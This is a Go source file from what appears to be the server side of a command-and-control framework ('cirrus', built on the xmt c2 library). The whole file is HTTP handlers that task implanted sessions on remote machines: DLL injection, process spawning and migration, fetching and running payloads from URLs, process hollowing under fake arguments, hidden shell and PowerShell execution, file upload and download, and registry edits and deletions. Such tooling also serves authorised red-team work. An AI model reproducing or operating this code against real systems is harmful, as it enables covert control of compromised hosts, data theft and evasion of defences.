package cirrus

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"net/http"
	"strconv"
	"strings"

	"github.com/PurpleSec/routex"
	"github.com/iDigitalFlame/xmt/c2"
	"github.com/iDigitalFlame/xmt/c2/task"
	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/com"
)

const msgNoBody = "http body is required or invalid"

func (s *sessionManager) httpTaskDLL(_ context.Context, w http.ResponseWriter, r *routex.Request, v interface{}) {
	t, ok := v.(*taskDLL)
	if t == nil || !ok {
		writeError(http.StatusBadRequest, msgNoBody, w, r)
		return
	}
	if len(t.Data) == 0 && len(t.Path) == 0 {
		writeError(http.StatusBadRequest, `specify a non-empty "data" or "path" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	d, err := t.Tasklet()
	if err != nil {
		writeError(http.StatusBadRequest, err.Error(), w, r)
		return
	}
	j, err := x.s.Tasklet(d)
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	if len(t.Path) > 0 {
		s.watchJob(x, j, "dll "+t.Path)
	} else {
		s.watchJob(x, j, "dll <bin>")
	}
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskSpawn(_ context.Context, w http.ResponseWriter, r *routex.Request, v interface{}) {
	t, ok := v.(*taskSpawn)
	if t == nil || !ok {
		writeError(http.StatusBadRequest, msgNoBody, w, r)
		return
	}
	if len(t.Name) == 0 || !isValidName(t.Name) {
		writeError(http.StatusBadRequest, `invalid or empty "name" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	p := s.profile(t.Profile)
	if len(p) == 0 && len(t.Profile) > 0 {
		writeError(http.StatusNotFound, msgNoProfile, w, r)
		return
	}
	var n *com.Packet
	if t.Method == "pexec" {
		var u string
		if err := json.Unmarshal(t.Payload, &u); err != nil {
			writeError(http.StatusNotFound, `value "payload" is invalid: `+err.Error(), w, r)
			return
		}
		if len(u) == 0 {
			writeError(http.StatusNotFound, `value "payload" cannot be empty`, w, r)
			return
		}
		n = task.SpawnPullProfile(t.Filter, t.Name, p, u)
	} else {
		c, err := t.Callable()
		if err != nil {
			writeError(http.StatusNotFound, err.Error(), w, r)
			return
		}
		n = task.SpawnProfile(t.Filter, t.Name, p, c)
	}
	j, err := x.s.Task(n)
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "spawn "+t.Method+" @"+t.Name)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskPexec(_ context.Context, w http.ResponseWriter, r *routex.Request, v interface{}) {
	t, ok := v.(*taskPull)
	if t == nil || !ok {
		writeError(http.StatusBadRequest, msgNoBody, w, r)
		return
	}
	if len(t.URL) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "url" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	j, err := x.s.Task(task.PullExecute(t.URL, t.Detach != boolTrue, t.Filter))
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "pexec "+t.URL)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskZombie(_ context.Context, w http.ResponseWriter, r *routex.Request, v interface{}) {
	t, ok := v.(*taskZombie)
	if t == nil || !ok {
		writeError(http.StatusBadRequest, msgNoBody, w, r)
		return
	}
	if len(t.Data) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "data" value`, w, r)
		return
	}
	if len(t.Fake) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "fake" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	d, err := t.Payload()
	if err != nil {
		writeError(http.StatusBadRequest, err.Error(), w, r)
		return
	}
	j, err := x.s.Tasklet(task.Zombie{Data: cmd.DLLToASM("", d), Args: cmd.Split(t.Fake), Filter: t.Filter, Hide: t.Show != boolTrue, Wait: t.Detach != boolTrue})
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "zombie "+t.Fake)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskSystem(_ context.Context, w http.ResponseWriter, r *routex.Request, v interface{}) {
	t, ok := v.(*taskSystem)
	if t == nil || !ok {
		writeError(http.StatusBadRequest, msgNoBody, w, r)
		return
	}
	if len(t.Command) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "command" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	j, err := x.systemTask(t.Command, t.Args, t.Filter)
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	if j == nil {
		w.WriteHeader(http.StatusOK)
		return
	}
	s.watchJob(x, j, "system "+t.Command)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskCommand(_ context.Context, w http.ResponseWriter, r *routex.Request, v interface{}) {
	t, ok := v.(*taskCommand)
	if t == nil || !ok {
		writeError(http.StatusBadRequest, msgNoBody, w, r)
		return
	}
	if len(t.Command) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "command" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	p := task.Process{Filter: t.Filter, Hide: t.Show != boolTrue, Wait: t.Detach != boolTrue}
	switch t.Command[0] {
	case '.':
		p.Args = []string{"@SHELL@", t.Command[1:]}
	case '$':
		p.Args = []string{"@PHELL@", "-nop", "-nol", "-c", t.Command[1:]}
	default:
		p.Args = cmd.Split(t.Command)
	}
	j, err := x.s.Tasklet(p)
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "execute "+strings.Join(p.Args, " "))
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskPull(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	p := c.StringDefault("path", "")
	if len(p) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "path" value`, w, r)
		return
	}
	u := c.StringDefault("url", "")
	if len(p) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "url" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	j, err := x.s.Task(task.Pull(u, p))
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "pull "+u+" "+p)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskMigrate(_ context.Context, w http.ResponseWriter, r *routex.Request, v interface{}) {
	t, ok := v.(*taskMigrate)
	if t == nil || !ok {
		writeError(http.StatusBadRequest, msgNoBody, w, r)
		return
	}
	if len(t.Name) == 0 || !isValidName(t.Name) {
		writeError(http.StatusBadRequest, `invalid or empty "name" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	p := s.profile(t.Profile)
	if len(p) == 0 && len(t.Profile) > 0 {
		writeError(http.StatusNotFound, msgNoProfile, w, r)
		return
	}
	var n *com.Packet
	if t.Method == "pexec" {
		var u string
		if err := json.Unmarshal(t.Payload, &u); err != nil {
			writeError(http.StatusNotFound, `value "payload" is invalid: `+err.Error(), w, r)
			return
		}
		if len(u) == 0 {
			writeError(http.StatusNotFound, `value "payload" cannot be empty`, w, r)
			return
		}
		n = task.MigratePullProfileEx(t.Filter, t.Wait != boolFalse, t.Name, p, u)
	} else {
		c, err := t.Callable()
		if err != nil {
			writeError(http.StatusNotFound, err.Error(), w, r)
			return
		}
		n = task.MigrateProfileEx(t.Filter, t.Wait != boolFalse, t.Name, p, c)
	}
	j, err := x.s.Task(n)
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "migrate "+t.Method+" @"+t.Name)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskAssembly(_ context.Context, w http.ResponseWriter, r *routex.Request, v interface{}) {
	t, ok := v.(*taskPayload)
	if t == nil || !ok {
		writeError(http.StatusBadRequest, msgNoBody, w, r)
		return
	}
	if len(t.Data) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "data" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	d, err := t.Payload()
	if err != nil {
		writeError(http.StatusBadRequest, err.Error(), w, r)
		return
	}
	j, err := x.s.Tasklet(task.Assembly{Data: cmd.DLLToASM("", d), Filter: t.Filter, Wait: t.Detach != boolTrue})
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "asm")
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskUpload(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	p := c.StringDefault("path", "")
	if len(p) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "path" value`, w, r)
		return
	}
	d := c.StringDefault("data", "")
	if len(p) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "data" value`, w, r)
		return
	}
	var (
		b   []byte
		err error
	)
	if len(d) > 0 {
		if b, err = base64.StdEncoding.DecodeString(d); err != nil {
			writeError(http.StatusBadRequest, `value "data" was not properly encoded`, w, r)
			return
		}
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	j, err := x.s.Task(task.Upload(p, b))
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "upload "+p)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskProfile(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	p := s.profile(c.StringDefault("profile", ""))
	if len(p) == 0 {
		writeError(http.StatusNotFound, msgNoProfile, w, r)
		return
	}
	j, err := x.s.SetProfileBytes(p)
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "profile "+p.String())
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskDownload(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	p := c.StringDefault("path", "")
	if len(p) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "path" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	j, err := x.s.Task(task.Download(p))
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "download "+p)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskRegistry(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	var (
		a = c.StringDefault("action", "")
		k = c.StringDefault("key", "")
		v = c.StringDefault("value", "")
	)
	if len(k) == 0 || len(a) == 0 {
		writeError(http.StatusBadRequest, `specify a non-empty "key" and "action" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	var (
		j   *c2.Job
		err error
	)
	switch strings.ToLower(a) {
	case "get":
		j, err = x.s.Task(task.RegGet(k, v))
	case "ls", "dir":
		j, err = x.s.Task(task.RegLs(k))
	case "set", "edit", "update":
		var (
			d = c.StringDefault("data", "")
			t = c.StringDefault("type", "")
		)
		switch strings.ToLower(t) {
		case "sz", "string":
			j, err = x.s.Task(task.RegSetString(k, v, d))
		case "bin", "binary":
			var b []byte
			if len(d) > 0 {
				if b, err = base64.StdEncoding.DecodeString(d); err != nil {
					writeError(http.StatusBadRequest, err.Error(), w, r)
					return
				}
			}
			j, err = x.s.Task(task.RegSetBytes(k, v, b))
		case "uint32", "dword":
			if i, err1 := c.Uint("data"); err1 == nil {
				j, err = x.s.Task(task.RegSetDword(k, v, uint32(i)))
			} else {
				i, err1 := strconv.ParseInt(d, 0, 32)
				if err1 != nil {
					writeError(http.StatusBadRequest, "invalid number: "+err1.Error(), w, r)
					return
				}
				j, err = x.s.Task(task.RegSetDword(k, v, uint32(i)))
			}
		case "uint64", "qword":
			if i, err1 := c.Uint("data"); err1 == nil {
				j, err = x.s.Task(task.RegSetQword(k, v, uint64(i)))
			} else {
				i, err1 := strconv.ParseInt(d, 0, 64)
				if err1 != nil {
					writeError(http.StatusBadRequest, "invalid number: "+err1.Error(), w, r)
					return
				}
				j, err = x.s.Task(task.RegSetQword(k, v, uint64(i)))
			}
		case "multi", "multi_sz":
			j, err = x.s.Task(task.RegSetStringList(k, v, strings.Split(d, "\n")))
		case "exp_sz", "expand_string":
			j, err = x.s.Task(task.RegSetExpandString(k, v, d))
		default:
			writeError(http.StatusBadRequest, "invalid type", w, r)
			return
		}
	case "del", "delete", "rm", "rem", "remove":
		if f := c.BoolDefault("force", false); len(v) == 0 {
			j, err = x.s.Task(task.RegDeleteKey(k, f))
		} else {
			j, err = x.s.Task(task.RegDelete(k, v, f))
		}
	default:
		writeError(http.StatusBadRequest, "invalid action", w, r)
		return
	}
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "regedit "+a+" "+k+":"+v)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskSystemIo(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	a := c.StringDefault("action", "")
	if len(a) == 0 {
		writeError(http.StatusBadRequest, `specify a non-empty "action" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	var (
		j   *c2.Job
		err error
	)
	switch strings.ToLower(a) {
	case "kill":
		i := c.UintDefault("pid", 0)
		if i == 0 {
			writeError(http.StatusBadRequest, `specify a valid "pid" value`, w, r)
			return
		}
		j, err = x.s.Task(task.Kill(uint32(i)))
	case "touch":
		n := c.StringDefault("path", "")
		if len(n) == 0 {
			writeError(http.StatusBadRequest, `specify a non-empty "path" value`, w, r)
			return
		}
		j, err = x.s.Task(task.Touch(n))
	case "delete":
		n := c.StringDefault("path", "")
		if len(n) == 0 {
			writeError(http.StatusBadRequest, `specify a non-empty "path" value`, w, r)
			return
		}
		j, err = x.s.Task(task.Delete(n, c.BoolDefault("force", false)))
	case "kill_name":
		n := c.StringDefault("name", "")
		if len(n) == 0 {
			writeError(http.StatusBadRequest, `specify a non-empty "name" value`, w, r)
			return
		}
		j, err = x.s.Task(task.KillName(n))
	case "move", "copy":
		var (
			n = c.StringDefault("source", "")
			d = c.StringDefault("dest", "")
		)
		if len(n) == 0 {
			writeError(http.StatusBadRequest, `specify a non-empty "source" value`, w, r)
			return
		}
		if len(d) == 0 {
			writeError(http.StatusBadRequest, `specify a non-empty "dest" value`, w, r)
			return
		}
		if a[0] == 'm' || a[0] == 'M' {
			j, err = x.s.Task(task.Move(n, d))
		} else {
			j, err = x.s.Task(task.Copy(n, d))
		}
	default:
		writeError(http.StatusBadRequest, "invalid action", w, r)
		return
	}
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "io "+a)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
